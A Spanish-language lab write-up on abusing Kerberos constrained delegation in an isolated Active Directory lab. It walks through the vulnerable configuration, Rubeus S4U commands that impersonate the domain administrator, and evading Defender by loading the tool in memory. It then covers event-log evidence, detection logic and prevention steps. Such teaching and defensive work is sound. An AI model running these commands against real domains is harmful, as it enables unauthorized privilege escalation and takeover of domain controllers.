# Kerberos Constrained Delegation

> ⚠️ Fines educativos, laboratorio aislado, ver disclaimer completo en el [README](../README.md).

## Índice
1. Descripción
2. Laboratorio y actores involucrados
3. Configuración de la vulnerabilidad (Paso 1)
4. Ejecución del ataque (Paso 2)
5. Evidencia en logs (Paso 3)
6. Detección (Paso 4)
7. Prevención
8. Lecciones aprendidas / problemas encontrados

---

## 1. Descripción

### 1.1 ¿Qué es la delegación en Kerberos?

La delegación permite que un servicio intermedio (por ejemplo, un servidor web) actúe **en nombre de un usuario** frente a un tercer servicio (por ejemplo, una base de datos), sin necesitar la contraseña de ese usuario. Es la solución de Microsoft al problema clásico de las arquitecturas de 3 capas: *Usuario → Servicio A → Servicio B*.

Analogía: un recepcionista de hotel (servicio intermedio) que llama al spa (servicio final) y dice "te mando a un cliente VIP nuestro, trátalo como si fuera él", el spa nunca habla directamente con el cliente, confía en el recepcionista.

### 1.2 Tipos de delegación

| Tipo | Descripción | Restricción |
|---|---|---|
| **Unconstrained (no restringida)** | La cuenta puede impersonar a cualquier usuario que se autentique contra ella, hacia **cualquier servicio del dominio** | Ninguna — la más peligrosa (se explota en el ataque 11) |
| **Constrained (restringida)** ← este ataque | La cuenta solo puede impersonar usuarios hacia una **lista concreta de servicios** (`msDS-AllowedToDelegateTo`) | Servicio(s) específico(s) |
| **Resource-based (basada en recursos)** | La configuración vive en el objeto **destino** ("quién puede delegar hacia mí"), no en el origen | Configurada en el recurso, no en el emisor |

### 1.3 Los dos niveles de restricción en Constrained Delegation

Cuando se configura, hay que especificar dos cosas:
1. **Hacia qué máquina/cuenta** puede delegar (en este lab: `DC01`)
2. **Hacia qué servicio concreto** de esa máquina (en este lab: `cifs`, no todos los servicios que ofrece DC01)

Todo lo que no está explícitamente en `msDS-AllowedToDelegateTo` está prohibido por defecto, de ahí el nombre "constrained" (restringida/constreñida).

### 1.4 "Usar solamente Kerberos" vs. "Usar cualquier protocolo de autenticación"

| Opción | Requisito | Mecanismo |
|---|---|---|
| **Kerberos solamente** | La víctima real debe autenticarse primero contra la cuenta delegante y entregarle un ticket *forwardable* legítimo | Solo **S4U2Proxy** |
| **Cualquier protocolo de autenticación** (Protocol Transition) | Ninguno — solo se necesita el *nombre* del usuario a impersonar | **S4U2Self** + **S4U2Proxy** |

La segunda opción activa el flag `TRUSTED_TO_AUTH_FOR_DELEGATION` en `userAccountControl`, y es la que hace posible este ataque sin que la víctima (Administrador) haga nada en absoluto.

### 1.5 Mecanismo técnico: S4U2Self + S4U2Proxy

1. **S4U2Self** ("Service for User to Self"): la cuenta comprometida pide al KDC un ticket **para sí misma**, pero "en nombre de" el usuario a impersonar. Gracias al protocol transition, el KDC lo concede sin pruebas de que ese usuario estuvo presente.
2. **S4U2Proxy** ("Service for User to Proxy"): con ese ticket, la cuenta comprometida pide un **segundo ticket**, esta vez para el servicio final autorizado en `msDS-AllowedToDelegateTo`. El KDC comprueba la whitelist y, si coincide, lo concede.

Resultado: un ticket válido del usuario impersonado para el servicio de destino, sin haber usado nunca su contraseña.

### 1.6 SPN: prerrequisito técnico

Un **SPN (Service Principal Name)** identifica de forma única un servicio en Kerberos (`clase_servicio/host:puerto`). Es necesario que una cuenta tenga al menos un SPN para que la pestaña "Delegación" esté disponible en su configuración, Windows interpreta la presencia de un SPN como "esta cuenta representa un servicio".

Ejemplos de clases de servicio: `HTTP`, `CIFS`, `LDAP`, `MSSQLSvc`, `HOST`, `TERMSRV`, `WSMAN`, `krbtgt`.

El SPN propio de la cuenta (qué representa) y el destino de la delegación (`msDS-AllowedToDelegateTo`, a quién puede suplantar usuarios) son **completamente independientes** entre sí.

### 1.7 Por qué es un ataque tan potente

A diferencia de **Kerberoasting** (ataque 02), donde se crackea offline el hash de una cuenta de servicio para obtener *su propia* contraseña, aquí no se crackea nada: controlando una cuenta de usuario "normal" con delegación mal configurada, se salta directamente a suplantar **cualquier usuario** (incluido el Administrador), sin necesitar su hash ni su contraseña en ningún momento.

---

## 2. Laboratorio y actores involucrados

| Elemento | Valor |
|---|---|
| Dominio | adlab.local |
| DC01 (víctima/objetivo final) | 100.100.100.50 |
| JORGE-CLIENTE (origen del ataque) | 100.100.100.40 |
| Cuenta comprometida (delegante) | `cucurella` / `Password123!` |
| Cuenta impersonada | `administrador` (built-in Administrator, en español) |
| Servicio de destino delegado | `cifs/DC01.adlab.local` |
| Herramienta usada | Rubeus v2.3.1, vía wrapper `Invoke-Rubeus.ps1` (PowerSharpPack) |

**Nota de escenario:** se asume que `cucurella` ya fue comprometida previamente (contraseña conocida), tal y como haría un atacante real tras un ataque de acceso inicial (Kerberoasting, credenciales en shares, phishing, etc.). Este ataque representa la **segunda fase** de una cadena de compromiso, no el punto de entrada.

---

## 3. Configuración de la vulnerabilidad (Paso 1 — GUI en DC01)

### 3.1 Asignar un SPN a `cucurella`

1. `Usuarios y equipos de Active Directory` → Ver → **Características avanzadas** ✅
2. Propiedades de `cucurella` → pestaña **Editor de atributos**
3. Atributo `servicePrincipalName` → Editar → añadir:
   ```
   HTTP/cucurella.adlab.local
   ```

Esto es un requisito técnico para que aparezca la pestaña "Delegación" (Windows solo la ofrece a cuentas que "representan un servicio").

![Asignando el SPN HTTP/cucurella.adlab.local al usuario cucurella desde el Editor de atributos](<img/Asigno SPN a usuario.png>)

### 3.2 Configurar la delegación restringida

1. Propiedades de `cucurella` → pestaña **Delegación**
2. Seleccionar: **"Confiar en este usuario para la delegación solo a los servicios especificados"**
3. Marcar: **"Usar cualquier protocolo de autenticación"** (activa protocol transition)
4. Agregar → buscar equipo `DC01` → seleccionar servicio **`cifs`**
5. Aceptar

![Pestaña Delegación de cucurella configurada con "Usar cualquier protocolo de autenticación" y el servicio cifs de DC01](<img/configuracion delegacion constringida.png>)

### 3.3 Verificación (evidencia "antes del ataque")

```powershell
Get-ADUser cucurella -Properties msDS-AllowedToDelegateTo, userAccountControl
```

Resultado obtenido:
```
msDS-AllowedToDelegateTo : {cifs/DC01, cifs/DC01/ADLAB, cifs/DC01.adlab.local, cifs/DC01.adlab.local/adlab.local...}
userAccountControl       : 16843264
```

Descomposición de `userAccountControl = 16843264`:
- `16777216` = `TRUSTED_TO_AUTH_FOR_DELEGATION` ✔️ (protocol transition activo)
- `65536` = `DONT_EXPIRE_PASSWORD`
- `512` = `NORMAL_ACCOUNT`

![Confirmando por PowerShell que msDS-AllowedToDelegateTo y userAccountControl se aplicaron correctamente sobre cucurella](<img/Confirmamos que los cambios se aplicaron.png>)

### 3.4 Auditoría necesaria (verificada, ya activa en este lab)

En **Default Domain Controllers Policy**:
```
Configuración del equipo → Directivas → Configuración de Windows → Configuración de seguridad
→ Configuración de directivas de auditoría avanzada → Directivas de auditoría
  → Inicio de sesión de cuenta:
      ✅ Auditar autenticación Kerberos       (Event 4768)
      ✅ Auditar operaciones de vale de servicio Kerberos  (Event 4769)
  → Inicio de sesión/Cierre de sesión:
      ✅ Auditar inicio de sesión              (Event 4624)
```

---

## 4. Ejecución del ataque (Paso 2 — JORGE-CLIENTE)

### 4.1 Obtención de la herramienta

`Rubeus.exe` es detectado y bloqueado por Windows Defender al descargarlo. Alternativa usada en este lab: **`Invoke-Rubeus.ps1`** (repo `S3cur3Th1sSh1t/PowerSharpPack`), un wrapper en PowerShell que embebe el `.exe` en base64 y lo ejecuta en memoria, sin dejarlo nunca como archivo suelto en disco.

```powershell
# Descargar el wrapper
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1" -OutFile "$env:USERPROFILE\Downloads\Invoke-Rubeus.ps1"

# Permitir su ejecución solo en esta sesión (no cambia la política del sistema)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Cargar la función Invoke-Rubeus en memoria
cd $env:USERPROFILE\Downloads
Import-Module .\Invoke-Rubeus.ps1
```

> Nota: en este lab, Windows Defender se desactivó temporalmente en JORGE-CLIENTE para evitar que eliminara el script durante la descarga.

![Descargando Invoke-Rubeus.ps1 e importándolo como módulo en memoria en JORGE-CLIENTE](<img/Descargamos Rubeus.png>)

### 4.2 Calcular el hash NTLM de la cuenta comprometida

```powershell
Invoke-Rubeus -Command "hash /password:Password123! /user:cucurella /domain:adlab.local"
```

Resultado:
```
rc4_hmac : 2B576ACBE6BCFDA7294D6BD18041B8FE
```

![Ejecutando Invoke-Rubeus para calcular el hash RC4 de cucurella](<img/Ejecutamos Rubeus.png>)

> **Comprobación previa recomendada:** Kerberos es muy sensible a la diferencia de reloj entre máquinas (tolerancia por defecto de 5 minutos). Antes de lanzar el ataque conviene verificar la sincronización horaria entre JORGE-CLIENTE y DC01 con `w32tm /stripchart /computer:DC01.adlab.local /samples:1`, para descartar errores de tipo `KRB_AP_ERR_SKEW` que no tienen relación con la lógica del ataque.

![Comprobando que no hay diferencia de reloj significativa entre JORGE-CLIENTE y DC01](<img/comprobamos diferencia de reloj.png>)

### 4.3 Ataque S4U (S4U2Self + S4U2Proxy)

Primer intento, con la contraseña entre comillas simples, falla con `KDC_ERR_PREAUTH_FAILED` porque Rubeus interpreta las comillas como parte literal de la contraseña (ver [Lecciones aprendidas](#8-lecciones-aprendidas--problemas-encontrados-durante-el-montaje)):

![Error KDC_ERR_PREAUTH_FAILED al calcular el hash con la contraseña entre comillas simples](<img/error a la hora de autenticar con hash.png>)

```powershell
Invoke-Rubeus -Command "s4u /user:cucurella /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /domain:adlab.local /impersonateuser:administrador /msdsspn:cifs/DC01.adlab.local /dc:DC01.adlab.local /ptt"
```

Salida relevante:
```
[+] TGT request successful!
[*] Building S4U2self request for: 'cucurella@ADLAB.LOCAL'
[+] S4U2self success!
[*] Got a TGS for 'administrador' to 'cucurella@ADLAB.LOCAL'
[*] Impersonating user 'administrador' to target SPN 'cifs/DC01.adlab.local'
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

Tras corregir la contraseña sin comillas y usar el `SamAccountName` real (`administrador`, no `Administrator`):

![Primer intento exitoso tras quitar las comillas de la contraseña y usar el nombre de usuario real administrador](<img/Exito tras cambiar comillas y administrador.png>)

![Confirmación del ataque S4U completado con S4U2self y S4U2proxy exitosos](<img/Exito tras cambiar comillas y admin 2.png>)

![Salida de Invoke-Rubeus mostrando el ataque S4U completado e importado en la sesión](<img/conseguimos el ataque.png>)

### 4.4 Verificación del ticket

```powershell
klist
```

```
Cliente: administrador @ ADLAB.LOCAL
Servidor: cifs/DC01.adlab.local @ ADLAB.LOCAL
Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
Marcas de vale: forwardable renewable pre_authent ok_as_delegate name_canonicalize
```

### 4.5 Prueba de impacto: acceso a DC01 como Administrador

```powershell
dir \\DC01.adlab.local\C$
```

```
Directorio: \\DC01.adlab.local\C$

PerfLogs
Program Files
Program Files (x86)
Scripts
SQL2019
Users
Windows
```

✅ **Acceso completo al disco `C:` del Controlador de Dominio, sin haber usado nunca la contraseña real de Administrador.**

![Listado del disco C$ de DC01 obtenido con el ticket impersonado, confirmando el acceso como Administrador](<img/evidencia atque realizado.png>)

---

## 5. Evidencia en logs (Paso 3 — Visor de eventos, DC01\Security)

### Evento 4768 — Solicitud de TGT (11:28:36)
```
Nombre de cuenta:        cucurella
Dirección de cliente:    ::ffff:100.100.100.40   (JORGE-CLIENTE)
Tipo de cifrado de vale: 0x17  (RC4-HMAC)
```

![Evento 4768 en el Visor de eventos de DC01: solicitud de TGT de cucurella desde JORGE-CLIENTE](<img/log 4768.png>)

### Evento 4769 (#1) — S4U2Self (11:28:36, puerto 49953)
```
Nombre de cuenta:      cucurella@ADLAB.LOCAL
Nombre de servicio:    cucurella   (la cuenta se pide un ticket a sí misma)
Servicios transitados: -   (vacío en este primer paso)
```

### Evento 4769 (#2) — S4U2Proxy (11:28:36, puerto 49954) 🚩 CLAVE
```
Nombre de cuenta:      cucurella@ADLAB.LOCAL
Nombre de servicio:    DC01$
Servicios transitados: cucurella@ADLAB.LOCAL   ← huella dactilar de la delegación
```

![Evento 4769 (S4U2Proxy) en el Visor de eventos de DC01, con el campo Servicios transitados mostrando cucurella@ADLAB.LOCAL](<img/log 4769.png>)

> Importante: el campo **"Nombre de cuenta"** sigue mostrando `cucurella`, no `administrador`, incluso en la petición del servicio final. El único lugar donde queda constancia explícita de la suplantación es el campo **"Servicios transitados"**.

### Evento 4624 — Logon final en DC01 (11:31:30)
```
Nuevo inicio de sesión:
  Nombre de cuenta:         administrador
  Id. de seguridad:         ADLAB\Administrator
Tipo de inicio de sesión:   3  (Red)
Nivel de suplantación:      Suplantación   🚩
Dirección de red de origen: 100.100.100.40  (JORGE-CLIENTE)
Proceso de inicio de sesión: Kerberos
```

![Evento 4624 en el Visor de eventos de DC01: logon final como administrador con nivel de suplantación](<img/log 4624.png>)

> En este lab, el campo "Servicios transitados" del evento 4624 no mostró contenido visible en la vista general, la evidencia principal de la delegación quedó registrada en el 4769 correspondiente. **Se recomienda correlacionar 4769 + 4624 por proximidad temporal y por la IP de origen**, no depender de un único evento.

### Bonus — Evidencia de intentos fallidos previos

Durante las pruebas se generaron eventos 4769 con `Código de error: 0x6` (`KDC_ERR_C_PRINCIPAL_UNKNOWN`) al intentar impersonar a un usuario `Administrator` (en inglés) que no existe en este dominio (la cuenta real es `administrador`). **Múltiples eventos 4769 con código de error 0x6 para la misma cuenta origen, en un periodo corto de tiempo, es en sí mismo un patrón sospechoso** (indicio de un atacante probando nombres de usuario a ciegas).

![Evento 4769 con código de error 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN) al impersonar el usuario inexistente Administrator](<img/log 4769 error.png>)

---

## 6. Detección (Paso 4)

Ver script [`Detect-KerberosConstrainedDelegation.ps1`](Detect-KerberosConstrainedDelegation.ps1).

**Lógica principal:**
1. Buscar eventos **4769** en el log de Seguridad
2. Filtrar aquellos cuyo campo `TransmittedServices` (Servicios transitados) **no esté vacío**
3. Clasificar la severidad según si la cuenta comprometida (la que aparece en "Nombre de cuenta", origen de la delegación) apunta a un usuario/servicio sensible
4. Detectar además ráfagas de eventos 4769 con `ResultCode = 0x6` para la misma cuenta origen (indicio de enumeración de nombres de usuario)
5. Generar un informe consolidado

---

## 7. Prevención

1. **Marcar las cuentas privilegiadas como "La cuenta es confidencial y no se puede delegar"** (`Account is sensitive and cannot be delegated`), en la pestaña Cuenta de sus propiedades.
2. **Añadir cuentas privilegiadas al grupo `Protected Users`**: aplica automáticamente la protección anterior, aunque debe evaluarse su impacto antes de implementarlo en producción.
3. **Auditar periódicamente `msDS-AllowedToDelegateTo`** en todo el dominio para detectar delegaciones no autorizadas:
   ```powershell
   Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo
   ```
4. **Tratar cualquier cuenta con delegación configurada como extremadamente privilegiada**, independientemente de sus permisos nominales, su contraseña debe ser fuerte y rotar con frecuencia (para no depender de que además sea vulnerable a Kerberoasting).
5. Preferir, cuando sea posible, **Resource-Based Constrained Delegation** en lugar de la clásica, y evitar "Usar cualquier protocolo de autenticación" salvo necesidad real de protocol transition.

---

## 8. Lecciones aprendidas / problemas encontrados durante el montaje

| Problema | Causa | Solución |
|---|---|---|
| `Rubeus.exe` bloqueado por Defender | Firma conocida de herramienta ofensiva | Uso de `Invoke-Rubeus.ps1` (binario embebido en memoria) + exclusión/desactivación temporal de Defender |
| `KDC_ERR_PREAUTH_FAILED` | La contraseña se pasó entre comillas simples (`'Password123!'`), y Rubeus las interpretó como parte literal de la contraseña, generando un hash incorrecto | Repetir el cálculo del hash sin comillas: `/password:Password123!` |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` en S4U2Self | Se usó `/impersonateuser:Administrator` (inglés), pero la cuenta real del dominio es `administrador` (español) | Usar el `SamAccountName` real, verificado con `Get-ADUser Administrador` |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` en S4U2Proxy | El SPN se pasó con comillas escapadas innecesarias (`` /msdsspn:`"cifs/DC01.adlab.local`" ``), quedando literalmente con comillas dentro del valor | Como el SPN no tiene espacios, no necesita comillas: `/msdsspn:cifs/DC01.adlab.local` |
| Import-Module se pierde entre sesiones | `Set-ExecutionPolicy -Scope Process` y el módulo importado solo viven en la sesión de PowerShell activa | Repetir la secuencia completa (`Set-ExecutionPolicy` + `cd` + `Import-Module`) en cada nueva consola |

---

## Notas importantes

1. **No es un exploit de software**, es un abuso de una función legítima de Kerberos (delegación), igual que Golden Ticket abusa del protocolo en sí.

2. **Requiere dos precondiciones simultáneas**, un SPN en la cuenta y `TRUSTED_TO_AUTH_FOR_DELEGATION` activo. Si falta cualquiera de las dos, el ataque no es posible.

3. **El rastro forense no está donde se esperaría**, el campo "Nombre de cuenta" del evento 4769 sigue mostrando la cuenta delegante, nunca la impersonada. La única prueba explícita está en "Servicios transitados".

4. **Es la segunda fase de una cadena de compromiso, no el punto de entrada**, necesita una cuenta ya comprometida previamente.

5. **Diferencia clave con Kerberoasting**, aquí no se crackea nada offline, se salta directo a impersonar sin necesitar el hash ni la contraseña del usuario objetivo.

---

## Referencias

- [Microsoft: S4U2Self and S4U2Proxy](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft: Event ID 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Microsoft: Event ID 4768](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [adsecurity.org: Kerberos & KRBTGT](https://adsecurity.org/?p=483)
- [harmj0y: S4U2Pwnage](https://harmj0y.medium.com/s4u2pwnage-36585c1c8e01)

---

**Estado**: Completado  
**Evidencia generada**: Event ID 4768, 4769 (S4U2Self/S4U2Proxy), 4624 (Kerberos Authentication, Delegation Abuse)

